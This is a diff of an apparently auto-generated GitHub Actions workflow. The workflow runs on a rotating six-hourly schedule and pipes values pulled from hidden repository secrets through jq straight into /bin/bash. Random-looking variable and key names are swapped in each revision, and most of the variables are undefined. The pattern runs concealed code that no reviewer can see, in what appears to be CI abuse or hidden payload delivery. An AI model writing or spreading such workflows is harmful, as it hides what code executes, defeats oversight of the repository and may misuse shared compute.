@@ -3,26 +3,18 @@ name: longfeishu2123
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 2/6 * * *'
+    - cron: '7 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: longfeishu2123
         env:
-          a2: ${{ secrets.a2 }}
+          c95568: ${{ secrets.c95568 }}
         run: |
-          echo $a2 | jq -r .b11 | /bin/bash
-          echo $ecleo8 | jq -r .bvpr508 | /bin/bash
-          echo $tshm12 | jq -r .awsud950 | /bin/bash
-          echo $zd2 | jq -r .vu743 | /bin/bash
-          echo $xaz099 | jq -r .bob0947 | /bin/bash
-          echo $ou90525 | jq -r .zsivn49 | /bin/bash
-          echo $rdtmb093 | jq -r .alj88 | /bin/bash
-          echo $gurox571 | jq -r .l4988 | /bin/bash
-          echo $h1 | jq -r .lkps112 | /bin/bash
-          echo $m6 | jq -r .st7334 | /bin/bash
-          echo $qlu84334 | jq -r .fgn66 | /bin/bash
+          echo $c95568 | jq -r .fqyq76 | /bin/bash
+          echo $jkkns21109 | jq -r .o83426 | /bin/bash
+          echo $sdrx7 | jq -r .tqn21 | /bin/bash
+          echo $obwck9 | jq -r .skefo434 | /bin/bash
 
